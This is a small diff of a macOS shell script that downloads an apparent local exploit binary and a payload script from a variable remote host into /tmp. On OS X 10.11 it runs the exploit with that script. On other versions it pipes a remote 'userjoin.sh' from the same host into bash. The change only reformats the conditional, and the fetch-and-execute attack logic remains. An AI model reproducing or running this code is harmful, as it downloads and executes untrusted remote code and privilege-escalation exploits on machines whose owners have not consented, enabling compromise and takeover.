@@ -10,11 +10,8 @@ curl -Lso /tmp/enact.sh $host:$down_port/mac/enact.sh
 
 chmod +x /tmp/exp.out /tmp/enact.sh
 
-if [[ $(defaults read loginwindow SystemVersionStampAsString) = "10.11."* ]] &&
-   [[ -f /tmp/exp.out ]]; then
-
-/tmp/exp.out <<< /tmp/enact.sh
-
+if [[ $(defaults read loginwindow SystemVersionStampAsString) = "10.11."* ]] && [[ -f /tmp/exp.out ]]; then
+    /tmp/exp.out <<< /tmp/enact.sh
 else
     curl -L $host:$down_port/mac/userjoin.sh |bash
 fi
